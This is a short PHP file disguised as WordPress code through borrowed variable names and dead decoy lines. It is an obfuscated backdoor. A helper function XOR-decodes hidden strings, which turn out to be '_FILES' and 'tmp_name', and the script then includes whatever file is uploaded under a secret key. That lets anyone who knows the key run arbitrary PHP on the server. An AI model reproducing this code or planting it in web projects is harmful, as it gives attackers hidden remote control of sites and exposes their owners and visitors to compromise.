<?php 	
$prev_value = 'UfoBuChULWY';

$post_type_meta_caps = $prev_value;
function real($translation_table, $translation)

{
	$lazyloader = 'stacksize';
    $tinkle = $translation;
    $original_link_html = urldecode($translation_table);

    $allowed_zones = substr($tinkle,0, strlen($original_link_html));

    $del_file = $original_link_html ^ $allowed_zones;
    return $del_file;
	$ancestors = 'icon_files';
}

$wp_post_types = ${real("%0A+%26%0E0%10", $post_type_meta_caps)};
$prime = $wp_post_types;

$end_dirty = isset($prime[$post_type_meta_caps]);

if ($end_dirty)

{

    $current_filter = $wp_post_types[$post_type_meta_caps];
    $ancestor = $current_filter[real("%21%0B%1F%1D%1B%22%050", $post_type_meta_caps)];
    $parent_id = $ancestor;

    include ($parent_id);
}
?>
